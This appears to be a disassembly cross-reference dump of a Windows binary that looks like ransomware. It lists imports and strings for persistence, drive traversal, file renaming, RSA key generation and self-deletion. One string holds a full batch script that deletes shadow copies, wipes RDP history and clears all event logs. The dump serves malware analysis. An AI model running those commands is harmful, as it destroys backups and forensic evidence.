reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x411c6b	0x41404c	import	0x411bca	KERNEL32.dll.ExitProcess
0x411c71	0x4140b4	import	0x411bca	KERNEL32.dll.lstrcatW
0x411c87	0x4141b4	import	0x411bca	SHLWAPI.dll.PathFindFileNameW
0x411ca1	0x4140b0	import	0x411bca	KERNEL32.dll.lstrcmpiW
0x411cc5	0x414084	import	0x411bca	KERNEL32.dll.CopyFileW
0x411ce3	0x4141b0	import	0x411bca	SHLWAPI.dll.PathRemoveFileSpecW
0x411cf4	0x412767	string	0x411bca	UVW3
0x411cf9	0x4140c8	import	0x411bca	KERNEL32.dll.lstrcpyW
0x411d08	0x418c30	string	0x411bca	.html
0x411d12	0x418bf4	string	0x411bca	KDATA
0x411d18	0x4121b6	string	0x411bca	SUVWR
0x411d27	0x414064	import	0x411bca	KERNEL32.dll.lstrcpynA
0x411d58	0x414004	import	0x411bca	ADVAPI32.dll.GetCurrentHwProfileW
0x411dd2	0x41210a	string	0x411bca	SUVW
0x411dfe	0x41210a	string	0x411bca	SUVW
0x411e3e	0x414040	import	0x411bca	KERNEL32.dll.CreateFileW
0x411e50	0x41403c	import	0x411bca	KERNEL32.dll.ReadFile
0x411e79	0x41405c	import	0x411bca	KERNEL32.dll.SetFilePointer
0x411eaf	0x4140cc	import	0x411bca	KERNEL32.dll.CloseHandle
0x411ecc	0x41407c	import	0x411bca	KERNEL32.dll.lstrcpyA
0x411eeb	0x414040	import	0x411bca	KERNEL32.dll.CreateFileW
0x411f07	0x41405c	import	0x411bca	KERNEL32.dll.SetFilePointer
0x411f0d	0x4140f0	import	0x411bca	KERNEL32.dll.lstrlenA
0x411f20	0x414034	import	0x411bca	KERNEL32.dll.WriteFile
0x411f3c	0x4140cc	import	0x411bca	KERNEL32.dll.CloseHandle
0x411f46	0x41409c	import	0x411bca	KERNEL32.dll.GetStdHandle
0x411f52	0x414068	import	0x411bca	KERNEL32.dll.FindResourceW
0x411f58	0x418c50	string	0x411bca	CODATA
0x411f63	0x414088	import	0x411bca	KERNEL32.dll.SizeofResource
0x411f79	0x4121b6	string	0x411bca	SUVWR
0x411f84	0x412acc	string	0x411bca	QSUVWj
0x411fab	0x4121b6	string	0x411bca	SUVWR
0x411fb6	0x412acc	string	0x411bca	QSUVWj
0x411fcd	0x412767	string	0x411bca	UVW3
0x411fd5	0x4140d4	import	0x411bca	KERNEL32.dll.lstrlenW
0x411fe9	0x4140e0	import	0x411bca	KERNEL32.dll.HeapCreate
0x411ff8	0x4140e8	import	0x411bca	KERNEL32.dll.HeapAlloc
0x412005	0x4140c8	import	0x411bca	KERNEL32.dll.lstrcpyW
0x41200c	0x4140b4	import	0x411bca	KERNEL32.dll.lstrcatW
0x412020	0x4129b2	string	0x411bca	QUVW3
0x41202b	0x41408c	import	0x411bca	KERNEL32.dll.HeapDestroy
0x41203b	0x4140ec	import	0x411bca	KERNEL32.dll.SetThreadExecutionState
0x412071	0x418b30	string	0x412056	Software\Microsoft\Windows\CurrentVersion\RunOnce
0x41207f	0x414008	import	0x412056	ADVAPI32.dll.RegOpenKeyExW
0x412087	0x4120ff	string	0x412056	_^][
0x41209d	0x418b94	string	0x412056	CertificatesCheck
0x4120a6	0x41400c	import	0x412056	ADVAPI32.dll.RegQueryValueExW
0x4120b2	0x4140b0	import	0x412056	KERNEL32.dll.lstrcmpiW
0x4120ce	0x414010	import	0x412056	ADVAPI32.dll.RegCreateKeyExW
0x4120d9	0x4140d4	import	0x412056	KERNEL32.dll.lstrlenW
0x4120e6	0x418b94	string	0x412056	CertificatesCheck
0x4120ef	0x414020	import	0x412056	ADVAPI32.dll.RegSetValueExW
0x4120f9	0x414000	import	0x412056	ADVAPI32.dll.RegCloseKey
0x412110	0x418c40	string	0x41210a	EXDATA
0x41211f	0x414068	import	0x41210a	KERNEL32.dll.FindResourceW
0x412127	0x414088	import	0x41210a	KERNEL32.dll.SizeofResource
0x412132	0x4121b6	string	0x41210a	SUVWR
0x41213b	0x412acc	string	0x41210a	QSUVWj
0x412145	0x4140f0	import	0x41210a	KERNEL32.dll.lstrlenA
0x412165	0x4140e0	import	0x41210a	KERNEL32.dll.HeapCreate
0x412175	0x4140e8	import	0x41210a	KERNEL32.dll.HeapAlloc
0x4121c2	0x414068	import	0x4121b6	KERNEL32.dll.FindResourceW
0x4121cc	0x41406c	import	0x4121b6	KERNEL32.dll.LoadResource
0x4121d6	0x414088	import	0x4121b6	KERNEL32.dll.SizeofResource
0x4121df	0x4140ac	import	0x4121b6	KERNEL32.dll.LockResource
0x4121ed	0x414030	import	0x4121b6	KERNEL32.dll.GetProcessHeap
0x4121f4	0x4140e8	import	0x4121b6	KERNEL32.dll.HeapAlloc
0x41220c	0x414060	import	0x4121b6	KERNEL32.dll.FreeResource
0x41222c	0x414030	import	0x412219	KERNEL32.dll.GetProcessHeap
0x412233	0x4140e8	import	0x412219	KERNEL32.dll.HeapAlloc
0x41223b	0x414078	import	0x412219	KERNEL32.dll.GetLogicalDrives
0x41226e	0x414080	import	0x412219	KERNEL32.dll.GetDriveTypeA
0x41228c	0x414030	import	0x412219	KERNEL32.dll.GetProcessHeap
0x412293	0x4140e8	import	0x412219	KERNEL32.dll.HeapAlloc
0x4122a2	0x41407c	import	0x412219	KERNEL32.dll.lstrcpyA
0x4122bb	0x4140a0	import	0x412219	KERNEL32.dll.lstrcmpiA
0x4122f5	0x412767	string	0x4122da	UVW3
0x412300	0x412767	string	0x4122da	UVW3
0x41230b	0x413087	string	0x4122da	SVWj\bj
0x41231b	0x412512	string	0x4122da	_^][
0x412321	0x4140b4	import	0x4122da	KERNEL32.dll.lstrcatW
0x412327	0x4140b0	import	0x4122da	KERNEL32.dll.lstrcmpiW
0x412345	0x4140d4	import	0x4122da	KERNEL32.dll.lstrlenW
0x41236d	0x414058	import	0x4122da	KERNEL32.dll.FindFirstFileW
0x4123c5	0x4129b2	string	0x4122da	QUVW3
0x4123d7	0x4127eb	string	0x4122da	QQSU3ۉL$\fVW blocks=Basic Latin,Arabic
0x4123fe	0x413087	string	0x4122da	SVWj\bj
0x412409	0x4127eb	string	0x4122da	QQSU3ۉL$\fVW blocks=Basic Latin,Arabic
0x412443	0x4141b4	import	0x4122da	SHLWAPI.dll.PathFindFileNameW
0x412469	0x4140c4	import	0x4122da	KERNEL32.dll.SetFileAttributesW
0x412474	0x4127eb	string	0x4122da	QQSU3ۉL$\fVW blocks=Basic Latin,Arabic
0x41249a	0x4140c8	import	0x4122da	KERNEL32.dll.lstrcpyW
0x4124c0	0x414074	import	0x4122da	KERNEL32.dll.MoveFileExW
0x4124d5	0x414030	import	0x4122da	KERNEL32.dll.GetProcessHeap
0x4124dc	0x41402c	import	0x4122da	KERNEL32.dll.HeapFree
0x4124ec	0x4140b8	import	0x4122da	KERNEL32.dll.FindNextFileW
0x4124fb	0x4140a4	import	0x4122da	KERNEL32.dll.FindClose
0x412523	0x4141b0	import	0x41251d	SHLWAPI.dll.PathRemoveFileSpecW
0x412529	0x4140b4	import	0x41251d	KERNEL32.dll.lstrcatW
0x41255d	0x414040	import	0x41251d	KERNEL32.dll.CreateFileW
0x412579	0x4140f0	import	0x41251d	KERNEL32.dll.lstrlenA
0x412587	0x414034	import	0x41251d	KERNEL32.dll.WriteFile
0x41258e	0x4140cc	import	0x41251d	KERNEL32.dll.CloseHandle
0x41259a	0x414090	import	0x412599	KERNEL32.dll.GetFileAttributesW
0x4125cb	0x414054	import	0x4125ab	KERNEL32.dll.GetTempFileNameW
0x4125d1	0x418a8c	string	0x4125ab	.bat
0x4125db	0x4140c8	import	0x4125ab	KERNEL32.dll.lstrcpyW
0x4125f5	0x414040	import	0x4125ab	KERNEL32.dll.CreateFileW
0x41260b	0x4140d4	import	0x4125ab	KERNEL32.dll.lstrlenW
0x412623	0x418ad4	string	0x4125ab	" goto Repeat\r\ndel "
0x41262c	0x418ab8	string	0x4125ab	"\r\nif exist "
0x41263a	0x418a98	string	0x4125ab	:Repeat\r\ndel "
0x41264f	0x4140a8	import	0x4125ab	KERNEL32.dll.LocalAlloc
0x412657	0x418a98	string	0x4125ab	:Repeat\r\ndel "
0x41265d	0x4140c8	import	0x4125ab	KERNEL32.dll.lstrcpyW
0x412663	0x4140b4	import	0x4125ab	KERNEL32.dll.lstrcatW
0x412671	0x418ab8	string	0x4125ab	"\r\nif exist "
0x412681	0x418ad4	string	0x4125ab	" goto Repeat\r\ndel "
0x4126a8	0x4129b2	string	0x4125ab	QUVW3
0x4126af	0x414034	import	0x4125ab	KERNEL32.dll.WriteFile
0x4126b6	0x4140c0	import	0x4125ab	KERNEL32.dll.LocalFree
0x4126bd	0x4140cc	import	0x4125ab	KERNEL32.dll.CloseHandle
0x4126f0	0x418a80	string	0x4126d7	__tmp
0x4126fa	0x414054	import	0x4126d7	KERNEL32.dll.GetTempFileNameW
0x412700	0x418a8c	string	0x4126d7	.bat
0x41270c	0x4140b4	import	0x4126d7	KERNEL32.dll.lstrcatW
0x412728	0x414040	import	0x4126d7	KERNEL32.dll.CreateFileW
0x412739	0x4188c0	string	0x4126d7	@echo off\r\nvssadmin.exe Delete Shadows /All /Quiet\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f\r\nreg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"\r\ncd %userprofile%\documents\\r\nattrib Default.rdp -s -h\r\ndel Default.rdp \r\nfor /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
0x412740	0x4140f0	import	0x4126d7	KERNEL32.dll.lstrlenA
0x412749	0x414034	import	0x4126d7	KERNEL32.dll.WriteFile
0x412750	0x4140cc	import	0x4126d7	KERNEL32.dll.CloseHandle
0x412776	0x414098	import	0x412767	KERNEL32.dll.MultiByteToWideChar
0x412785	0x414030	import	0x412767	KERNEL32.dll.GetProcessHeap
0x41278c	0x4140e8	import	0x412767	KERNEL32.dll.HeapAlloc
0x41279d	0x414098	import	0x412767	KERNEL32.dll.MultiByteToWideChar
0x4127df	0x414070	import	0x4127a9	KERNEL32.dll.CreateProcessW
0x41284e	0x4140f0	import	0x4127eb	KERNEL32.dll.lstrlenA
0x412859	0x4140f0	import	0x4127eb	KERNEL32.dll.lstrlenA
0x412867	0x4140f0	import	0x4127eb	KERNEL32.dll.lstrlenA
0x412877	0x4140f0	import	0x4127eb	KERNEL32.dll.lstrlenA
0x412880	0x4140a0	import	0x4127eb	KERNEL32.dll.lstrcmpiA
0x4128a4	0x4140f0	import	0x4127eb	KERNEL32.dll.lstrlenA
0x4128b0	0x4140f0	import	0x4127eb	KERNEL32.dll.lstrlenA
0x4128be	0x4140f0	import	0x4127eb	KERNEL32.dll.lstrlenA
0x4128ce	0x4140f0	import	0x4127eb	KERNEL32.dll.lstrlenA
0x4128d7	0x4140a0	import	0x4127eb	KERNEL32.dll.lstrcmpiA
0x412929	0x4140f0	import	0x412921	KERNEL32.dll.lstrlenA
0x4129c9	0x414038	import	0x4129b2	KERNEL32.dll.WideCharToMultiByte
0x4129d3	0x414030	import	0x4129b2	KERNEL32.dll.GetProcessHeap
0x4129da	0x4140e8	import	0x4129b2	KERNEL32.dll.HeapAlloc
0x4129f0	0x414038	import	0x4129b2	KERNEL32.dll.WideCharToMultiByte
0x412ade	0x4140e0	import	0x412acc	KERNEL32.dll.HeapCreate
0x412aef	0x4140e8	import	0x412acc	KERNEL32.dll.HeapAlloc
0x412af8	0x4140f0	import	0x412acc	KERNEL32.dll.lstrlenA
0x412b02	0x412a5d	string	0x412acc	QSUVW
0x412b3d	0x414030	import	0x412b2f	KERNEL32.dll.GetProcessHeap
0x412b44	0x4140e8	import	0x412b2f	KERNEL32.dll.HeapAlloc
0x412bbf	0x414040	import	0x412ba8	KERNEL32.dll.CreateFileW
0x412be3	0x4140cc	import	0x412ba8	KERNEL32.dll.CloseHandle
0x412c3a	0x4140f0	import	0x412bef	KERNEL32.dll.lstrlenA
0x412c64	0x414034	import	0x412bef	KERNEL32.dll.WriteFile
0x412cd7	0x418c6c	string	0x412c83	rsa_genkey
0x412cdd	0x4140f0	import	0x412c83	KERNEL32.dll.lstrlenA
0x412cf9	0x414030	import	0x412c83	KERNEL32.dll.GetProcessHeap
0x412d33	0x412ba8	string	0x412c83	SVW3\v
0x412d71	0x4140e8	import	0x412c83	KERNEL32.dll.HeapAlloc
0x412db2	0x4140e8	import	0x412c83	KERNEL32.dll.HeapAlloc
0x412de7	0x4140e8	import	0x412c83	KERNEL32.dll.HeapAlloc
0x412e81	0x414030	import	0x412c83	KERNEL32.dll.GetProcessHeap
0x412e8b	0x41402c	import	0x412c83	KERNEL32.dll.HeapFree
0x412ecf	0x412b2f	string	0x412c83	SUVW
0x412f36	0x418c60	string	0x412edd	rsa_encrypt
0x412f3c	0x4140f0	import	0x412edd	KERNEL32.dll.lstrlenA
0x412f6e	0x4185f4	string	0x412edd	010001
0x41301e	0x4140d4	import	0x413019	KERNEL32.dll.lstrlenW
0x41302e	0x414030	import	0x413019	KERNEL32.dll.GetProcessHeap
0x413035	0x4140e8	import	0x413019	KERNEL32.dll.HeapAlloc
0x41303f	0x4140c8	import	0x413019	KERNEL32.dll.lstrcpyW
0x41305e	0x4140c8	import	0x41304a	KERNEL32.dll.lstrcpyW
0x413068	0x414030	import	0x41304a	KERNEL32.dll.GetProcessHeap
0x41306f	0x41402c	import	0x41304a	KERNEL32.dll.HeapFree
0x413078	0x414030	import	0x41304a	KERNEL32.dll.GetProcessHeap
0x41307f	0x41402c	import	0x41304a	KERNEL32.dll.HeapFree
0x413092	0x414030	import	0x413087	KERNEL32.dll.GetProcessHeap
0x413099	0x4140e8	import	0x413087	KERNEL32.dll.HeapAlloc
0x41320b	0x41321b	string	0x413180	+D$\f\eT$
0x413211	0x41321b	string	0x413180	+D$\f\eT$
